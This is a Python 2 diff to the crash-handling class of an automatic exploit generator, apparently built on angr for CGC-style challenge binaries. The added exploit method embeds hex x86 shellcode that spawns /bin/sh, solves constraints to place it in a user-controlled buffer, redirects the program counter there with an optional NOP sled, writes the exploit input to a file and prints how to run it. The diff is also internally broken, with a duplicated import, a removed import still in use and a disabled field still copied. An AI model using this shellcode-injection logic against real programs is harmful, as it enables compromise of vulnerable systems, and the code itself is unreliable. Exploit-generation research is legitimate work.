@@ -11,12 +11,16 @@ import random
 import tracer
 import hashlib
 import operator
-from analyzer import Analyzer
-from .trace_additions import ChallRespInfo, ZenPlugin
-from maeg.exploit import CannotExploit, CannotExplore, ExploitFactory, CGCExploitFactory
-from maeg.vulnerability import Vulnerability
-from simuvex import SimMemoryError, s_options as so
 
+from analyzer import Analyzer
+from analyzer import Analyzer
+from exploiter import Exploiter
+from verifier import Verifier
+
+from trace_additions import ChallRespInfo, ZenPlugin
+from exploit import Exploit
+from vulnerability import Vulnerability
+from simuvex import SimMemoryError, s_options as so
 
 class NonCrashingInput(Exception):
     pass
@@ -46,8 +50,13 @@ class Crash(object):
         :angrop_object: an angrop object, should only be set by exploration methods      
         '''
         # some info from prev path, in order to execute prev path but bypass the crash point.
-        self.analyzer = Analyzer(binary)
         self.binary = binary
+
+        self.payloads = []
+        self.analyzer = Analyzer(self.binary)
+        self.exploiter = Exploiter(self.binary)
+        self.verifier = Verifier(self.binary)
+
         self.crash  = crash
         self.pov_file = pov_file
         self.constrained_addrs = [ ] if constrained_addrs is None else constrained_addrs
@@ -135,11 +144,11 @@ class Crash(object):
         l.debug("filtering writes")
         memory_writes = [m for m in memory_writes if m/0x1000 != 0x4347c] # start of pages
         user_writes = [m for m in memory_writes if any("stdin" in v for v in self.state.memory.load(m, 1).variables)] # memory controlled by user
-        flag_writes = [m for m in memory_writes if any(v.startswith("cgc-flag") for v in self.state.memory.load(m, 1).variables)] # cgc-flag control
+        # flag_writes = [m for m in memory_writes if any(v.startswith("cgc-flag") for v in self.state.memory.load(m, 1).variables)] # cgc-flag control
         l.debug("done filtering writes")
 
         self.symbolic_mem = self._segment(user_writes)
-        self.flag_mem = self._segment(flag_writes)
+        # self.flag_mem = self._segment(flag_writes)
 
         # crash type
         self.crash_types = []
@@ -282,17 +291,154 @@ class Crash(object):
 
         return self.one_of(exploitables)
 
-    def exploit(self):
-        analysis = self.analyzer.analyze(self.prev)
-        for payload in self.exploiter.generate(self.prev, analysis):
-            if not payload:
-                break
-            if self.verifier.verify(payload):
-                self.payloads.append(payload)
-                l.info('Generated!')
-                return True
-        l.info('Can not generate any payload.')
-        return False
+    def _prepare_exploit_factory(self, blacklist_symbolic_explore=True, **kwargs):
+        # crash should have been classified at this point
+        if not self.exploitable():
+            raise CannotExploit("non-exploitable crash")
+
+        if blacklist_symbolic_explore:
+            if "blacklist_techniques" in kwargs:
+                kwargs["blacklist_techniques"].add("explore_for_exploit")
+            else:
+                kwargs["blacklist_techniques"] = {"explore_for_exploit"}
+
+        exploit = ExploitFactory(self, **kwargs)
+
+        return exploit
+
+    # def exploit(self):
+    #     self.analysis = self.analyzer.analyze(self.prev)
+    #     for payload in self.exploiter.generate(self.prev, self.analysis):
+    #         if not payload:
+    #             break
+    #         if self.verifier.verify(payload):
+    #             self.payloads.append(payload)
+    #             l.info('Generated!')
+    #             return True
+    #     l.info('Can not generate any payload.')
+    #     return False
+
+    def exploit(self, blacklist_symbolic_explore=True, **kwargs):
+        '''
+        craft an exploit for a crash
+        '''
+
+        # factory = self._prepare_exploit_factory(blacklist_symbolic_explore, **kwargs)
+
+        # factory.initialize()
+        # return factory
+        shellcode = "6a68682f2f2f73682f62696e89e331c96a0b5899cd80".decode('hex')
+        # self.jump_addr, self.mem_start = self._ip_overwrite_call_shellcode(shellcode)
+
+        control = {}
+        min_addr = self.project.loader.main_bin.get_min_addr()
+        max_addr = self.project.loader.main_bin.get_max_addr()
+        for addr in self.symbolic_mem:
+            if addr >= min_addr and addr < max_addr:
+                control[addr] = self.symbolic_mem[addr]
+        # assert len(control) > 0
+        sc_bvv = self.state.se.BVV(shellcode)
+        buf_addr = control.keys()[0]
+        memory = self.state.memory.load(buf_addr, len(shellcode))
+        if self.state.satisfiable(extra_constraints=(memory == sc_bvv,self.state.regs.pc == buf_addr)):
+            l.info("found buffer for shellcode, completing exploit")
+            self.state.add_constraints(memory == sc_bvv)
+            l.info("pointing pc towards shellcode buffer")
+            self.state.add_constraints(self.state.regs.pc == buf_addr)
+        else:
+            l.error('wrong, can\'t solve constraint')
+        filename = '%s-exploit' % self.binary
+        with open(filename,'w') as f:
+            f.write(self.state.posix.dumps(0))
+        print "%s exploit in %s" % (self.binary, filename)
+        print "run with `(cat %s; cat -) | %s`" % (filename, self.binary) 
+
+    def _ip_overwrite_call_shellcode(self, shellcode, variables=None):
+        '''
+        exploit an ip overwrite with shellcode
+        :param shellcode: shellcode to call
+        :param variables: variables to check unconstrainedness of
+        :return: tuple of the address to jump to, and address of requested shellcode in memory
+        '''
+
+        # TODO inspect register state and see if any registers are pointing to symbolic memory
+        # if any registers are pointing to symbolic memory look for gadgets to call or jmp there
+
+        if variables is None:
+            variables = [ ]
+
+        # accumulate valid memory, this depends on the os and memory permissions
+        valid_memory = { }
+
+        # XXX linux special case, bss is executable if the stack is executable
+        if self.project.loader.main_bin.execstack and self.os == "unix":
+            valid_memory.update(self._global_control())
+
+        # hack! max address hueristic for CGC
+        for mem, _ in sorted(valid_memory.items(), \
+                key=lambda x: (0xffffffff - x[0]) + x[1])[::-1]:
+            for mem_start in xrange(mem+valid_memory[mem]-(len(shellcode)/8), mem, -1):
+
+                # default jump addr is the shellcode
+                jump_addr = mem_start
+
+                shc_constraints = [ ]
+
+                shc_constraints.append(self.state.regs.ip == mem_start)
+
+                sym_mem = self.state.memory.load(mem_start, len(shellcode))
+                shc_constraints.append(sym_mem == shellcode)
+
+                # hack! TODO: make this stronger/more flexible
+                for v in variables:
+                    shc_constraints.append(v == 0x41414141)
+
+                if self.state.satisfiable(extra_constraints=shc_constraints):
+
+                    # room for a nop sled?
+                    length = mem_start - mem
+                    if length > 0:
+
+                        # try to add a nop sled, we could be more thorough, but it takes too
+                        # much time
+                        new_nop_constraints = [ ]
+
+                        sym_nop_mem = self.state.memory.load(mem, length)
+                        nop_sld_bvv = self.state.se.BVV("\x90" * length)
+                        nop_const = sym_nop_mem == nop_sld_bvv
+
+                        # can the nop sled exist?
+                        new_nop_constraints.append(nop_const)
+                        # can the shellcode still exist?
+                        new_nop_constraints.append(sym_mem == shellcode)
+                        # can ip point to the nop sled?
+                        new_nop_constraints.append(self.state.regs.ip == mem)
+
+                        if self.state.satisfiable(extra_constraints=new_nop_constraints):
+                            jump_addr = mem
+
+                    return (jump_addr, mem_start)
+
+        raise CannotExploit("no place to fit shellcode")
+
+    def _global_control(self):
+        '''
+        determine what symbolic memory we control which is at a constant address
+        '''
+
+        control = { }
+
+        # PIE binaries will give no global control without knowledge of the binary base
+        if self.project.loader.main_bin.pic:
+            return control
+
+        min_addr = self.project.loader.main_bin.get_min_addr()
+        max_addr = self.project.loader.main_bin.get_max_addr()
+        for addr in self.symbolic_mem:
+            if addr >= min_addr and addr < max_addr:
+                control[addr] = self.symbolic_mem[addr]
+
+        return control
 
     def save(self, file_name = None):
         file_name = self.binary + '1' if file_name is None else file_name
@@ -318,11 +464,33 @@ class Crash(object):
 
         return bool(len(set(self.crash_types).intersection(set(crash_types))))
 
+    def copy(self):
+        cp = Crash.__new__(Crash)
+        cp.binary = self.binary
+        cp.crash = self.crash
+        cp.project = self.project
+        cp.os = self.os
+        cp.aslr = self.aslr
+        cp.prev = self.prev.copy()
+        cp.state = self.state.copy()
+        cp.rop = self.rop
+        cp.added_actions = list(self.added_actions)
+        cp.symbolic_mem = self.symbolic_mem.copy()
+        cp.flag_mem = self.flag_mem.copy()
+        cp.crash_types = self.crash_types
+        cp._tracer = self._tracer
+        cp.violating_action = self.violating_action
+        cp.explore_steps = self.explore_steps
+        cp.constrained_addrs = list(self.constrained_addrs)
+
+        return cp
+
     def _reconstrain_flag_data(self, state):
 
         l.info("reconstraining flag")
 
         replace_dict = dict()
+        # constrain input: <Bool file_/dev/stdin_39_0_4139_8 == 65>
         for c in self._tracer.preconstraints:
             if any([v.startswith('cgc-flag') or v.startswith("random") for v in list(c.variables)]):
                 concrete = next(a for a in c.args if not a.symbolic)
